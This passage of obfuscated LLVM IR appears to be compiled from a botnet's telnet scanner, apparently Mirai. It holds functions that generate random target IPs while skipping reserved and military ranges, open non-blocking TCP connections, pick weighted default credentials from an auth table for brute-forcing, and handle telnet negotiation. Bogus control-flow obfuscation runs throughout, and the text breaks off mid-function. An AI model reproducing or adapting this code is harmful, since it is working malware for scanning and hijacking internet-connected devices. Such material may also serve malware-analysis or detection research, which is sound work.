  %386 = or i1 %384, %385
  br i1 %386, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %378, label %481, label %387

; <label>:387:                                    ; preds = %originalBBpart252, %363
  %388 = load i8, i8* %10, align 1
  %389 = zext i8 %388 to i32
  %390 = icmp eq i32 %389, 160
  br i1 %390, label %391, label %395

; <label>:391:                                    ; preds = %387
  %392 = load i8, i8* %11, align 1
  %393 = zext i8 %392 to i32
  %394 = icmp eq i32 %393, 13
  br i1 %394, label %481, label %395

; <label>:395:                                    ; preds = %391, %387
  %396 = load i32, i32* @x.57
  %397 = load i32, i32* @y.58
  %398 = sub i32 %396, 1
  %399 = mul i32 %396, %398
  %400 = urem i32 %399, 2
  %401 = icmp eq i32 %400, 0
  %402 = icmp slt i32 %397, 10
  %403 = or i1 %401, %402
  br i1 %403, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %395
  %404 = load i8, i8* %10, align 1
  %405 = zext i8 %404 to i32
  %406 = icmp eq i32 %405, 6
  %407 = load i32, i32* @x.57
  %408 = load i32, i32* @y.58
  %409 = sub i32 %407, 1
  %410 = mul i32 %407, %409
  %411 = urem i32 %410, 2
  %412 = icmp eq i32 %411, 0
  %413 = icmp slt i32 %408, 10
  %414 = or i1 %412, %413
  br i1 %414, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %406, label %479, label %415

; <label>:415:                                    ; preds = %originalBBpart256
  %416 = load i8, i8* %10, align 1
  %417 = zext i8 %416 to i32
  %418 = icmp eq i32 %417, 7
  br i1 %418, label %479, label %419

; <label>:419:                                    ; preds = %415
  %420 = load i8, i8* %10, align 1
  %421 = zext i8 %420 to i32
  %422 = icmp eq i32 %421, 11
  br i1 %422, label %479, label %423

; <label>:423:                                    ; preds = %419
  %424 = load i8, i8* %10, align 1
  %425 = zext i8 %424 to i32
  %426 = icmp eq i32 %425, 21
  br i1 %426, label %479, label %427

; <label>:427:                                    ; preds = %423
  %428 = load i8, i8* %10, align 1
  %429 = zext i8 %428 to i32
  %430 = icmp eq i32 %429, 22
  br i1 %430, label %479, label %431

; <label>:431:                                    ; preds = %427
  %432 = load i8, i8* %10, align 1
  %433 = zext i8 %432 to i32
  %434 = icmp eq i32 %433, 26
  br i1 %434, label %479, label %435

; <label>:435:                                    ; preds = %431
  %436 = load i8, i8* %10, align 1
  %437 = zext i8 %436 to i32
  %438 = icmp eq i32 %437, 28
  br i1 %438, label %479, label %439

; <label>:439:                                    ; preds = %435
  %440 = load i8, i8* %10, align 1
  %441 = zext i8 %440 to i32
  %442 = icmp eq i32 %441, 29
  br i1 %442, label %479, label %443

; <label>:443:                                    ; preds = %439
  %444 = load i8, i8* %10, align 1
  %445 = zext i8 %444 to i32
  %446 = icmp eq i32 %445, 30
  br i1 %446, label %479, label %447

; <label>:447:                                    ; preds = %443
  %448 = load i8, i8* %10, align 1
  %449 = zext i8 %448 to i32
  %450 = icmp eq i32 %449, 33
  br i1 %450, label %479, label %451

; <label>:451:                                    ; preds = %447
  %452 = load i8, i8* %10, align 1
  %453 = zext i8 %452 to i32
  %454 = icmp eq i32 %453, 55
  br i1 %454, label %479, label %455

; <label>:455:                                    ; preds = %451
  %456 = load i8, i8* %10, align 1
  %457 = zext i8 %456 to i32
  %458 = icmp eq i32 %457, 214
  br i1 %458, label %479, label %459

; <label>:459:                                    ; preds = %455
  %460 = load i32, i32* @x.57
  %461 = load i32, i32* @y.58
  %462 = sub i32 %460, 1
  %463 = mul i32 %460, %462
  %464 = urem i32 %463, 2
  %465 = icmp eq i32 %464, 0
  %466 = icmp slt i32 %461, 10
  %467 = or i1 %465, %466
  br i1 %467, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %459
  %468 = load i8, i8* %10, align 1
  %469 = zext i8 %468 to i32
  %470 = icmp eq i32 %469, 215
  %471 = load i32, i32* @x.57
  %472 = load i32, i32* @y.58
  %473 = sub i32 %471, 1
  %474 = mul i32 %471, %473
  %475 = urem i32 %474, 2
  %476 = icmp eq i32 %475, 0
  %477 = icmp slt i32 %472, 10
  %478 = or i1 %476, %477
  br i1 %478, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %479

; <label>:479:                                    ; preds = %originalBBpart260, %455, %451, %447, %443, %439, %435, %431, %427, %423, %419, %415, %originalBBpart256
  %480 = phi i1 [ true, %455 ], [ true, %451 ], [ true, %447 ], [ true, %443 ], [ true, %439 ], [ true, %435 ], [ true, %431 ], [ true, %427 ], [ true, %423 ], [ true, %419 ], [ true, %415 ], [ true, %originalBBpart256 ], [ %470, %originalBBpart260 ]
  br label %481

; <label>:481:                                    ; preds = %479, %391, %originalBBpart252, %359, %originalBBpart248, %327, %303, %279, %271, %263, %originalBBpart236, %originalBBpart228, %175, %147, %originalBBpart216, %111, %originalBBpart212, %originalBBpart28, %67, %63, %59, %originalBBpart24
  %482 = phi i1 [ true, %391 ], [ true, %originalBBpart252 ], [ true, %359 ], [ true, %originalBBpart248 ], [ true, %327 ], [ true, %303 ], [ true, %279 ], [ true, %271 ], [ true, %263 ], [ true, %originalBBpart236 ], [ true, %originalBBpart228 ], [ true, %175 ], [ true, %147 ], [ true, %originalBBpart216 ], [ true, %111 ], [ true, %originalBBpart212 ], [ true, %originalBBpart28 ], [ true, %67 ], [ true, %63 ], [ true, %59 ], [ true, %originalBBpart24 ], [ %480, %479 ]
  br i1 %482, label %22, label %483

; <label>:483:                                    ; preds = %481
  %484 = load i8, i8* %10, align 1
  %485 = zext i8 %484 to i32
  %486 = shl i32 %485, 24
  %487 = load i8, i8* %11, align 1
  %488 = zext i8 %487 to i32
  %489 = shl i32 %488, 16
  %490 = or i32 %486, %489
  %491 = load i8, i8* %12, align 1
  %492 = zext i8 %491 to i32
  %493 = shl i32 %492, 8
  %494 = or i32 %490, %493
  %495 = load i8, i8* %13, align 1
  %496 = zext i8 %495 to i32
  %497 = shl i32 %496, 0
  %498 = or i32 %494, %497
  %499 = call i32 @htonl(i32 %498) #7
  ret i32 %499

originalBBalteredBB:                              ; preds = %originalBB, %0
  %500 = alloca i32, align 4
  %501 = alloca i8, align 1
  %502 = alloca i8, align 1
  %503 = alloca i8, align 1
  %504 = alloca i8, align 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %39
  %505 = load i8, i8* %10, align 1
  %506 = zext i8 %505 to i32
  %507 = icmp eq i32 %506, 127
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %71
  %508 = load i8, i8* %10, align 1
  %509 = zext i8 %508 to i32
  %510 = icmp eq i32 %509, 16
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %91
  %511 = load i8, i8* %10, align 1
  %512 = zext i8 %511 to i32
  %513 = icmp eq i32 %512, 56
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %119
  %514 = load i8, i8* %11, align 1
  %515 = zext i8 %514 to i32
  %516 = icmp eq i32 %515, 168
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %151
  %517 = load i8, i8* %10, align 1
  %518 = zext i8 %517 to i32
  %519 = icmp eq i32 %518, 100
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %179
  %520 = load i8, i8* %10, align 1
  %521 = zext i8 %520 to i32
  %522 = icmp eq i32 %521, 169
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %199
  %523 = load i8, i8* %11, align 1
  %524 = zext i8 %523 to i32
  %525 = icmp sgt i32 %524, 254
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %219
  %526 = load i8, i8* %10, align 1
  %527 = zext i8 %526 to i32
  %528 = icmp eq i32 %527, 198
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %243
  %529 = load i8, i8* %11, align 1
  %530 = zext i8 %529 to i32
  %531 = icmp slt i32 %530, 20
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %283
  %532 = load i8, i8* %10, align 1
  %533 = zext i8 %532 to i32
  %534 = icmp eq i32 %533, 106
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %307
  %535 = load i8, i8* %10, align 1
  %536 = zext i8 %535 to i32
  %537 = icmp eq i32 %536, 106
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %335
  %538 = load i8, i8* %11, align 1
  %539 = zext i8 %538 to i32
  %540 = icmp eq i32 %539, 31
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %367
  %541 = load i8, i8* %11, align 1
  %542 = zext i8 %541 to i32
  %543 = icmp eq i32 %542, 62
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %395
  %544 = load i8, i8* %10, align 1
  %545 = zext i8 %544 to i32
  %546 = icmp eq i32 %545, 6
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %459
  %547 = load i8, i8* %10, align 1
  %548 = zext i8 %547 to i32
  %549 = icmp eq i32 %548, 215
  br label %originalBB58
}

; Function Attrs: noinline nounwind uwtable
define internal void @setup_connection(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 16, i32 4, i1 false)
  %6 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %6, i32 0, i32 1
  %8 = load i32, i32* %7, align 8
  %9 = icmp ne i32 %8, -1
  br i1 %9, label %10, label %15

; <label>:10:                                     ; preds = %1
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 1
  %13 = load i32, i32* %12, align 8
  %14 = call i32 @close(i32 %13)
  br label %15

; <label>:15:                                     ; preds = %10, %1
  %16 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %17 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %18 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %17, i32 0, i32 1
  store i32 %16, i32* %18, align 8
  %19 = icmp eq i32 %16, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %15
  br label %59

; <label>:21:                                     ; preds = %15
  %22 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %22, i32 0, i32 6
  store i32 0, i32* %23, align 4
  %24 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %24, i32 0, i32 7
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %25, i32 0, i32 0
  call void @util_zero(i8* %26, i32 256)
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 1
  %29 = load i32, i32* %28, align 8
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 1
  %32 = load i32, i32* %31, align 8
  %33 = call i32 (i32, i32, ...) @fcntl(i32 %32, i32 3, i32 0)
  %34 = or i32 2048, %33
  %35 = call i32 (i32, i32, ...) @fcntl(i32 %29, i32 4, i32 %34)
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %38 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %37, i32 0, i32 4
  %39 = load i32, i32* %38, align 4
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %41 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %40, i32 0, i32 0
  store i32 %39, i32* %41, align 4
  %42 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %43 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %42, i32 0, i32 5
  %44 = load i16, i16* %43, align 8
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %44, i16* %45, align 2
  %46 = load i32, i32* @fake_time, align 4
  %47 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %48 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %47, i32 0, i32 2
  store i32 %46, i32* %48, align 4
  %49 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %50 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %49, i32 0, i32 3
  store i32 1, i32* %50, align 8
  %51 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %52 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %51, i32 0, i32 1
  %53 = load i32, i32* %52, align 8
  %54 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %55 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %55, %struct.sockaddr** %54, align 8
  %56 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %57 = load %struct.sockaddr*, %struct.sockaddr** %56, align 8
  %58 = call i32 @connect(i32 %53, %struct.sockaddr* %57, i32 16)
  br label %59

; <label>:59:                                     ; preds = %21, %20
  %60 = load i32, i32* @x.59
  %61 = load i32, i32* @y.60
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %59
  %68 = load i32, i32* @x.59
  %69 = load i32, i32* @y.60
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %59
  br label %originalBB
}

declare i32 @select(i32, %struct.fd_set.26*, %struct.fd_set.26*, %struct.fd_set.26*, %struct.timeval.27*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

; Function Attrs: noinline nounwind uwtable
define internal %struct.scanner_auth* @random_auth_entry() #0 {
  %1 = alloca %struct.scanner_auth*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i16, align 2
  %4 = call i32 @rand_next()
  %5 = load i16, i16* @auth_table_max_weight, align 2
  %6 = zext i16 %5 to i32
  %7 = urem i32 %4, %6
  %8 = trunc i32 %7 to i16
  store i16 %8, i16* %3, align 2
  store i32 0, i32* %2, align 4
  br label %9

; <label>:9:                                      ; preds = %91, %0
  %10 = load i32, i32* %2, align 4
  %11 = load i32, i32* @auth_table_len, align 4
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %13, label %94

; <label>:13:                                     ; preds = %9
  %14 = load i16, i16* %3, align 2
  %15 = zext i16 %14 to i32
  %16 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %17 = load i32, i32* %2, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %16, i64 %18
  %20 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %19, i32 0, i32 2
  %21 = load i16, i16* %20, align 8
  %22 = zext i16 %21 to i32
  %23 = icmp slt i32 %15, %22
  br i1 %23, label %24, label %25

; <label>:24:                                     ; preds = %13
  br label %91

; <label>:25:                                     ; preds = %13
  %26 = load i32, i32* @x.61
  %27 = load i32, i32* @y.62
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %25
  %34 = load i16, i16* %3, align 2
  %35 = zext i16 %34 to i32
  %36 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %37 = load i32, i32* %2, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %36, i64 %38
  %40 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %39, i32 0, i32 3
  %41 = load i16, i16* %40, align 2
  %42 = zext i16 %41 to i32
  %43 = icmp slt i32 %35, %42
  %44 = load i32, i32* @x.61
  %45 = load i32, i32* @y.62
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %43, label %52, label %73

; <label>:52:                                     ; preds = %originalBBpart2
  %53 = load i32, i32* @x.61
  %54 = load i32, i32* @y.62
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  %61 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %62 = load i32, i32* %2, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %61, i64 %63
  store %struct.scanner_auth* %64, %struct.scanner_auth** %1, align 8
  %65 = load i32, i32* @x.61
  %66 = load i32, i32* @y.62
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %111

; <label>:73:                                     ; preds = %originalBBpart2
  %74 = load i32, i32* @x.61
  %75 = load i32, i32* @y.62
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %73
  %82 = load i32, i32* @x.61
  %83 = load i32, i32* @y.62
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %90

; <label>:90:                                     ; preds = %originalBBpart28
  br label %91

; <label>:91:                                     ; preds = %90, %24
  %92 = load i32, i32* %2, align 4
  %93 = add nsw i32 %92, 1
  store i32 %93, i32* %2, align 4
  br label %9

; <label>:94:                                     ; preds = %9
  %95 = load i32, i32* @x.61
  %96 = load i32, i32* @y.62
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %94
  store %struct.scanner_auth* null, %struct.scanner_auth** %1, align 8
  %103 = load i32, i32* @x.61
  %104 = load i32, i32* @y.62
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %111

; <label>:111:                                    ; preds = %originalBBpart212, %originalBBpart24
  %112 = load %struct.scanner_auth*, %struct.scanner_auth** %1, align 8
  ret %struct.scanner_auth* %112

originalBBalteredBB:                              ; preds = %originalBB, %25
  %113 = load i16, i16* %3, align 2
  %114 = zext i16 %113 to i32
  %115 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %116 = load i32, i32* %2, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %115, i64 %117
  %119 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %118, i32 0, i32 3
  %120 = load i16, i16* %119, align 2
  %121 = zext i16 %120 to i32
  %122 = icmp slt i32 %114, %121
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  %123 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %124 = load i32, i32* %2, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %123, i64 %125
  store %struct.scanner_auth* %126, %struct.scanner_auth** %1, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %73
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %94
  store %struct.scanner_auth* null, %struct.scanner_auth** %1, align 8
  br label %originalBB10
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define i32 @recv_strip_null(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 %11, i8* %12, i64 %14, i32 %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %59

; <label>:20:                                     ; preds = %4
  %21 = load i32, i32* @x.63
  %22 = load i32, i32* @y.64
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %20
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  %29 = load i32, i32* @x.63
  %30 = load i32, i32* @y.64
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %37

; <label>:37:                                     ; preds = %55, %originalBBpart2
  %38 = load i32, i32* %10, align 4
  %39 = load i32, i32* %9, align 4
  %40 = icmp slt i32 %38, %39
  br i1 %40, label %41, label %58

; <label>:41:                                     ; preds = %37
  %42 = load i8*, i8** %6, align 8
  %43 = load i32, i32* %10, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %42, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 0
  br i1 %48, label %49, label %54

; <label>:49:                                     ; preds = %41
  %50 = load i8*, i8** %6, align 8
  %51 = load i32, i32* %10, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds i8, i8* %50, i64 %52
  store i8 65, i8* %53, align 1
  br label %54

; <label>:54:                                     ; preds = %49, %41
  br label %55

; <label>:55:                                     ; preds = %54
  %56 = load i32, i32* %10, align 4
  %57 = add nsw i32 %56, 1
  store i32 %57, i32* %10, align 4
  br label %37

; <label>:58:                                     ; preds = %37
  br label %59

; <label>:59:                                     ; preds = %58, %4
  %60 = load i32, i32* %9, align 4
  ret i32 %60

originalBBalteredBB:                              ; preds = %originalBB, %20
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_iacs(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [3 x i8], align 1
  %7 = alloca [9 x i8], align 1
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  store i32 0, i32* %3, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  store i8* %10, i8** %4, align 8
  br label %11

; <label>:11:                                     ; preds = %296, %88, %1
  %12 = load i32, i32* %3, align 4
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 6
  %15 = load i32, i32* %14, align 4
  %16 = icmp slt i32 %12, %15
  br i1 %16, label %17, label %297

; <label>:17:                                     ; preds = %11
  %18 = load i8*, i8** %4, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp ne i32 %20, 255
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %17
  br label %297

; <label>:23:                                     ; preds = %17
  %24 = load i32, i32* @x.65
  %25 = load i32, i32* @y.66
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %23
  %32 = load i8*, i8** %4, align 8
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 %34, 255
  %36 = load i32, i32* @x.65
  %37 = load i32, i32* @y.66
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %35, label %44, label %295

; <label>:44:                                     ; preds = %originalBBpart2
  %45 = load i32, i32* @x.65
  %46 = load i32, i32* @y.66
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %44
  %53 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %54 = load i8*, i8** %4, align 8
  %55 = call signext i8 @can_consume(%struct.scanner_connection* %53, i8* %54, i32 1)
  %56 = icmp ne i8 %55, 0
  %57 = load i32, i32* @x.65
  %58 = load i32, i32* @y.66
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %56, label %82, label %65

; <label>:65:                                     ; preds = %originalBBpart24
  %66 = load i32, i32* @x.65
  %67 = load i32, i32* @y.66
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %65
  %74 = load i32, i32* @x.65
  %75 = load i32, i32* @y.66
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %297

; <label>:82:                                     ; preds = %originalBBpart24
  %83 = load i8*, i8** %4, align 8
  %84 = getelementptr inbounds i8, i8* %83, i64 1
  %85 = load i8, i8* %84, align 1
  %86 = zext i8 %85 to i32
  %87 = icmp eq i32 %86, 255
  br i1 %87, label %88, label %93

; <label>:88:                                     ; preds = %82
  %89 = load i8*, i8** %4, align 8
  %90 = getelementptr inbounds i8, i8* %89, i64 2
  store i8* %90, i8** %4, align 8
